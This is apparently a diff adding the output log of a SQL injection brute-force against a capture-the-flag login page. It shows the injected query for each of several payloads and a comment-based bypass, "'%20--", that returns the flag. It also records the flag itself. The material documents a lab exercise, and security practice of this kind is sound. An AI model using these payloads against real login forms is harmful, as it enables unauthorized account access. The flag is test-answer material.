@@ -1,0 +1,27 @@
+ p.inset {border-style: inset;} SELECT * FROM login WHERE User=''' AND Password='''Sorry to say, that's invalid login info!
+ p.inset {border-style: inset;} SELECT * FROM login WHERE User=''' AND Password='''Sorry to say, that's invalid login info!
+ p.inset {border-style: inset;} SELECT * FROM login WHERE User='"' AND Password='"'Sorry to say, that's invalid login info!
+ p.inset {border-style: inset;} SELECT * FROM login WHERE User='"' AND Password='"'Sorry to say, that's invalid login info!
+ p.inset {border-style: inset;} SELECT * FROM login WHERE User='#' AND Password='#'Sorry to say, that's invalid login info!
+ p.inset {border-style: inset;} SELECT * FROM login WHERE User='#' AND Password='#'Sorry to say, that's invalid login info!
+ p.inset {border-style: inset;} SELECT * FROM login WHERE User='-' AND Password='-'Sorry to say, that's invalid login info!
+ p.inset {border-style: inset;} SELECT * FROM login WHERE User='-' AND Password='-'Sorry to say, that's invalid login info!
+ p.inset {border-style: inset;} SELECT * FROM login WHERE User='--' AND Password='--'Sorry to say, that's invalid login info!
+ p.inset {border-style: inset;} SELECT * FROM login WHERE User='--' AND Password='--'Sorry to say, that's invalid login info!
+ p.inset {border-style: inset;} SELECT * FROM login WHERE User=''%20--' AND Password=''%20--'UDCTF{SQL_inj3ct10n_m0r3_l1k3_b4d_c0d3_d3t3ct10n}
+payload: '%20--
+<html>
+ <head>
+  <style>
+   p.inset {border-style: inset;}
+  </style>
+ </head>
+ <body>
+  <p class="inset">
+   SELECT * FROM login WHERE User=''%20--' AND Password=''%20--'
+  </p>
+  UDCTF{SQL_inj3ct10n_m0r3_l1k3_b4d_c0d3_d3t3ct10n}
+ </body>
+</html>
+
+FOUND FLAG: UDCTF{SQL_inj3ct10n_m0r3_l1k3_b4d_c0d3_d3t3ct10n}
